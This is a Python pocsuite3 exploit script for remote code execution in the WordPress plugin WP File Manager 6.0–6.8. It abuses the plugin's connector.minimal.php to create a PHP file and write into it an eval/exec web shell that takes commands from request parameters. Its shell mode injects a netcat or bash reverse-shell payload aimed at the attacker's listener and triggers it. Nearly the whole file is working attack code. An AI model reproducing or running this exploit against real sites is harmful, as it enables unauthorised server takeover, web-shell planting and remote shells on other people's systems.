#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/27 9:41 
# @Author   : ordar
# @File     : wp_filemanager_rce.py  
# @Project  : pythonCourse
# @Python   : 3.7.5
import base64
import threading
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, register_poc, requests
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.lib.utils import random_str
from requests.exceptions import ReadTimeout


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1'
    author = ['ordar']
    vulDate = ' 2020-09-16'
    createDate = '2020-11-27'
    updateDate = '2020-11-27'
    references = ['https://blog.csdn.net/ordar123/article/details/108614611']
    name = 'wordpress plugin file manager 6.0< verison <6.8 RCE'
    appPowerLink = 'https://cn.wordpress.org/plugins/wp-file-manager/advanced/'
    appName = 'File Manager'
    appVersion = '6.0<vul<6.8'
    vulType = 'Romote Code Execution'
    desc = '''
    WordPress插件WP File Manager 6.0-6.8 存在任意文件上传可以导致命令执行
    '''
    samples = []
    install_requires = ['']

    def _options(self):
        o = OrderedDict()
        eval_code = {
            "eval": """{}<?php @eval($_POST[\'cmd\']); @eval($_GET[\'cmd\']); ?>""".format(random_str()),
            "exec": """{}<?php echo(exec($_GET[\'cmd\'])); ?>""".format(random_str())
        }
        o["eval"] = OptDict(default=eval_code, selected="eval")
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["payload"] = OptDict(default=payload, selected="bash")
        return o

    def _verify(self):
        self.file_name = "{}.php".format(random_str())
        self.plugin_path = "/wp-content/plugins/wp-file-manager/lib"
        makefile_url = "{}/php/connector.minimal.php?cmd=mkfile&name={}&target=l1_Lw".format(self.plugin_path, self.file_name)
        makefile_url = self.url + makefile_url
        # 创建空文件
        try:
            resp = requests.get(makefile_url)
            if self.file_name in resp.text:
                result = {}
                result["Stdout"] = "Make file success!"
                result["Url"] = self.url + self.plugin_path + "/files/{}".format(self.file_name)
                return self.parse_output(result)
            else:
                return None
        except ReadTimeout:
            pass
        except Exception as ex:
            pass

    def write_eval_payload(self, eval_payload):
        self._verify()

        payload = {'cmd': 'put',
                   'target': 'l1_' + base64.b64encode(self.file_name.encode()).decode(),
                   'content': eval_payload
                   }
        # 写入payload
        try:
            write_file_url = self.url + self.plugin_path + "/php/connector.minimal.php"
            resp = requests.post(write_file_url, data=payload)
            if self.file_name in resp.text:
                result = {}
                result["Stdout"] = "Write file success!"
                result["Payload"] = eval_payload
                self.eval_url = self.url + self.plugin_path + "/files/{}?cmd=".format(self.file_name)
                result["Url"] = self.eval_url + "phpinfo();"
                return self.parse_output(result)
            else:
                return None
        except ReadTimeout:
            pass
        except Exception as ex:
            pass

    def _attack(self):
        eval_payload = self.get_option("eval")
        self.write_eval_payload(eval_payload)

    def _shell(self):
        cmd = self.get_option("payload").format(get_listener_ip(), get_listener_port())
        # print(cmd)
        # cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        eval_payload = """{}<?php exec("{}"); ?>""".format(random_str(), cmd)
        try:
            self.write_eval_payload(eval_payload)
            print(eval_payload)
            print(self.eval_url)
        except:
            exit(1)
        try:
            t = threading.Thread(target=requests.get, args=(self.eval_url,))
            t.start()
            # requests.get(self.eval_url)
        except ReadTimeout:
            pass
        except Exception as ex:
            pass

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail({'Error': 'target is not vulnerable'})
        return output


register_poc(DemoPOC)
